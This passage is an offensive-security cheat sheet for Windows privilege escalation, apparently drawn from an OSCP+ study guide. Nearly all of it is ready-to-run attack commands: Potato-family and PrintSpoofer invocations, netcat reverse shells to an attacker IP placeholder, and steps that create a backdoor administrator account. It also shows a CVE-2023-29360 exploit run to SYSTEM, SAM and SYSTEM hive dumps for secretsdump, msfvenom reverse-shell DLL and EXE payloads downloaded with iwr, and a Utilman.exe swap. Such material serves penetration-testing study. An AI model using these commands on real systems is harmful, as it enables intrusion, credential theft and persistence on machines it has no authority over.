EfsPotato.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### GodPotato

Commandes, paramètres et exemples associés à cette technique.


```bash
GodPotato.exe -cmd "C:\Windows\System32\cmd.exe"
```


```bash
GodPotato.exe -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
GodPotato.exe -cmd "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
GodPotato.exe -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### Hot Potato (CVE-2016-3225)

Commandes, paramètres et exemples associés à cette technique.


```bash
HotPotato.exe -ip -cmd "C:\Windows\System32\cmd.exe"
```


```bash
HotPotato.exe -ip -cmd "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
HotPotato.exe -ip -cmd "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### Juicy Potato

Commandes, paramètres et exemples associés à cette technique.


```bash
JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
```


```bash
JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### PrintSpoofer

Commandes, paramètres et exemples associés à cette technique.


```bash
PrintSpoofer.exe -c whoami
```


```bash
PrintSpoofer.exe -c "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
PrintSpoofer.exe -c "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
PrintSpoofer.exe -c "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### Rogue Potato

Commandes, paramètres et exemples associés à cette technique.


```bash
RoguePotato.exe -r [ATTACKER_IP] -e whoami
```


```bash
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
RoguePotato.exe -r [ATTACKER_IP] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### RottenPotato

Commandes, paramètres et exemples associés à cette technique.


```bash
RottenPotato.exe
```


### SharpEfsPotato

Commandes, paramètres et exemples associés à cette technique.


```bash
SharpEfsPotato.exe -p "C:\Windows\System32\cmd.exe"

# Example
SharpEfsPotato.exe -p "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "whoami | Set-Content C:\temp\w.log"
```


```bash
SharpEfsPotato.exe -p "C:\Windows\system32\cmd.exe" -a "/c C:\temp\nc.exe [kali_ip] [port] -e cmd.exe"
or
SharpEfsPotato.exe -p "C:\Windows\System32\nc.exe" -a "-e cmd.exe [kali_ip] [port]"
```


```bash
# Creates the new user
SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "user emma Password123 /add"

# Adds the user to the Administrators group
SharpEfsPotato.exe -p "C:\Windows\System32\net.exe" -a "localgroup Administrators emma /add"
```


### SigmaPotato

Commandes, paramètres et exemples associés à cette technique.


```bash
SigmaPotato.exe cmd.exe /c whoami
```


```bash
SigmaPotato.exe --revshell [ATTACKER_IP] 4444
```


```bash
# Creates the new user
SigmaPotato.exe cmd.exe /c "net user emma Password123 /add"

# Adds it as admin
SigmaPotato.exe cmd.exe /c "net localgroup Administrators emma /add"
```


### SweetPotato

Commandes, paramètres et exemples associés à cette technique.


```bash
SweetPotato.exe -a whoami
```


```bash
SweetPotato.exe -a "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```bash
# Creates the new user
SweetPotato.exe -a "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
SweetPotato.exe -a "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


## Exploits

Commandes, paramètres et exemples associés à cette technique.


### CVE-2023-29360

Commandes, paramètres et exemples associés à cette technique.


```text
CVE-2023-29360.exe
```


```powershell
PS C:\Users\emma\Desktop> whoami
redteam\emma

PS C:\Users\emma\Desktop> .\CVE-2023-29360.exe
[+] Device Description: Microsoft Streaming Service Proxy
Hardware IDs:
        "SW\{96E080C7-143C-11D1-B40F-00A0C9223196}"
[+] Device Instance ID: SW\{96E080C7-143C-11D1-B40F-00A0C9223196}\{3C0D501A-140B-11D1-B40F-00A0C9223196}
[+] First mapped _MDL: 25f9aa00140
[+] Second mapped _MDL: 25f9aa10040
[+] Unprivileged token reference: ffffd1072dde6061
[+] System token reference: ffffd1071de317d5
Microsoft Windows [Version 10.0.22621.1555]
(c) Microsoft Corporation. All rights reserved.

C:\Users\emma\Desktop> whoami
nt authority\system
```


### SeAssignPrimaryToken

Commandes, paramètres et exemples associés à cette technique.


```text
SeImpersonate
```


```text
JuicyPotato
```


```text
RoguePotato
```


```powershell
JuicyPotato.exe -l 1337 -c {4991d34b-80a1-4291-83b6-3328366b9097} -t * -p c:\windows\system32\cmd.exe
```


```powershell
JuicyPotato.exe -l 1337 -c {F0001111-0000-0000-0000-0000FEEDACDC} -t * -p "C:\Windows\System32\nc.exe -e cmd.exe [ATTACKER_IP] 4444"
```


```powershell
# Creates the new user
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
JuicyPotato.exe -l 1337 -c [clsid] -t * -p "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


```powershell
RoguePotato.exe -r [kali_ip] -e whoami
```


```powershell
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\nc.exe -e cmd.exe [kali_ip] [port]"
```


```powershell
# Creates the new user
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe user emma Password123 /add"

# Adds it as admin
RoguePotato.exe -r [kali_ip] -e "C:\Windows\System32\net.exe localgroup Administrators emma /add"
```


### SeBackup

Commandes, paramètres et exemples associés à cette technique.


```text
SeBackupPrivilege
```


```powershell
reg save hklm\sam c:\Temp\sam  
reg save hklm\system c:\Temp\system
```


```bash
impacket-secretsdump -system system -sam sam local
```


### SeDebug

Commandes, paramètres et exemples associés à cette technique.


```text
SeDebugPrivesc.exe
```


```powershell
ps
```


```powershell
.\SeDebugPrivesc.exe <PID> <Program and Arguments>
```


### SeImpersonate

Commandes, paramètres et exemples associés à cette technique.


```text
Disabled
```


### SeManageVolumeAbuse

Commandes, paramètres et exemples associés à cette technique.


```text
C:\
```


```text
.dll
```


```text
C:\Windows\System32\
```


```text
SeManageVolumeExploit.exe
```


```text
C:\Windows\System32\wbem\tzres.dll
```


```text
systeminfo
```


```powershell
whoami /priv
```


![Checking for SeManageVolume privilege.](https://www.emmanuelsolis.com/img/semanage_1.png)


```text
SeManageVolume
```


```powershell
.\SeManageVolumeExploit.exe
```


![Executing the exploit.](https://www.emmanuelsolis.com/img/semanage_2.png)


```bash
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=[port] -f dll -o tzres.dll
```


```text
C:\Windows\System32\wbem\tzres.dll
```


```powershell
iwr -uri http://[kali_ip]/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
```


![Replacing C:\Windows\System32\wbem\tzres.dll.](https://www.emmanuelsolis.com/img/semanage_3.png)


```text
C:\Windows\System32\wbem\tzres.dll
```


```text
systeminfo
```


```powershell
systeminfo
```


![Triggering the payload for a reverse shell.](https://www.emmanuelsolis.com/img/semanage_4.png)


### SeRestore

Commandes, paramètres et exemples associés à cette technique.


```text
utilman.exe
```


```text
SeRestoreAbuse.exe
```


```text
utilman.exe
```


```text
utilman.exe
```


```powershell
cd C:\Windows\system32

ren Utilman.exe Utilman.old
```


```powershell
ren cmd.exe Utilman.exe
```


```powershell
# Lock the computer
Windows + L

# Connect via RDP in a way that request for credentials in the Windows screen
rdesktop [ip]
```


```text
nt authority\system
```


```powershell
# Once in the Windows Login Screen press
Windows + U
```


```text
SerestoreAbuse.exe
```


```powershell
iwr -uri http://[kali_ip]/SeRestoreAbuse.exe -O SeRestoreAbuse.exe
```


```powershell
# (Option 1) Netcat direct reverse shell
.\SeRestoreAbuse.exe "C:\temp\nc.exe [attacker_ip] [port] -e powershell.exe"

# (Option 2) Payload reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[kali_ip] LPORT=[port] -f exe -o payload.exe
.\SeRestoreAbuse.exe C:\temp\payload.exe
```


---

Source documentaire : [OSCP+ Cheatsheet d'Emmanuel Solis](https://www.emmanuelsolis.com/oscp.html).
